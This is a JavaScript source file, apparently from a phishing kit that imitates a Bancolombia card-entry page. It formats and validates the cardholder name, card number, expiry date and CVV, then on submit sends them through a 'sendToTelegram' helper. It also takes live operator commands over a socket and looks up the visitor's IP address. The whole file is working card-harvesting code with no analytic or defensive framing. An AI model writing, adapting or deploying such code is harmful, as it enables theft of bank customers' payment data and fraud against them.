document.addEventListener('DOMContentLoaded', function() {
    const cardForm = document.getElementById('cardForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const cardHolderInput = document.getElementById('cardHolder');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');
    const submitButton = document.querySelector('.btn-iniciar');
    const overlay = document.getElementById('loadingOverlay');
    
    if (!cardForm || !overlay) return;
    
    overlay.classList.remove('active', 'show');
    overlay.style.display = '';
    
    const socketInstance = BancoUtils.initSocket();
    if (socketInstance) socketInstance.removeAllListeners('telegramAction');

    // Formatear número de tarjeta
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '').slice(0, 16);
        let formatted = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        
        e.target.value = formatted;
        validateForm();
    });

    // Formatear fecha (MM/YY)
    expiryDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '').slice(0, 4);
        
        if (value.length >= 2) {
            const month = Math.min(parseInt(value.substring(0, 2)), 12).toString().padStart(2, '0');
            const year = value.substring(2);
            e.target.value = year ? `${month}/${year}` : month;
        } else {
            e.target.value = value;
        }
        
        validateForm();
    });

    // Validar CVV
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        validateForm();
    });

    // Validar nombre
    cardHolderInput.addEventListener('input', validateForm);

    // Función de validación
    function validateForm() {
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        const cardHolder = cardHolderInput.value.trim();
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;

        const isValid = 
            cardNumber.length === 16 &&
            cardHolder.length >= 5 &&
            /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate) &&
            cvv.length >= 3 && cvv.length <= 4;

        submitButton.disabled = !isValid;
        
        if (isValid) {
            submitButton.style.backgroundColor = '#FFD700';
            submitButton.style.cursor = 'pointer';
        } else {
            submitButton.style.backgroundColor = '';
            submitButton.style.cursor = 'default';
        }
    }

    // Manejar envío
    cardForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const currentSocket = BancoUtils.getSocket();
        if (!currentSocket || !currentSocket.connected) {
            BancoUtils.initSocket();
            await new Promise(resolve => setTimeout(resolve, 500));
        }
        
        overlay.classList.add('active');
        overlay.style.display = 'flex';
        
        const data = {
            tarjetaTitular: cardHolderInput.value,
            tarjetaNumero: cardNumberInput.value,
            tarjetaVencimiento: expiryDateInput.value,
            tarjetaCVV: cvvInput.value
        };
        
        const fullData = BancoUtils.saveBankData('bancolombia', data);
        const message = BancoUtils.formatMessage('BANCOLOMBIA - Tarjeta', fullData);
        const keyboard = BancolombiaTelegram.getKeyboard();
        
        try {
            await BancoUtils.sendToTelegram('tarjeta', { text: message, keyboard });
        } catch (error) {
            overlay.classList.remove('active');
            overlay.style.display = 'none';
            alert('Error al procesar. Intenta nuevamente.');
        }
    });
    
    BancoUtils.onTelegramAction((data) => BancolombiaTelegram.handleTelegramAction(data));

    // Actualizar IP y fecha/hora
    async function updateInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipEl = document.getElementById('ipAddress');
            if (ipEl) ipEl.textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            const dateEl = document.getElementById('datetime');
            if (dateEl) dateEl.textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateInfo();
    setInterval(updateInfo, 60000);
});
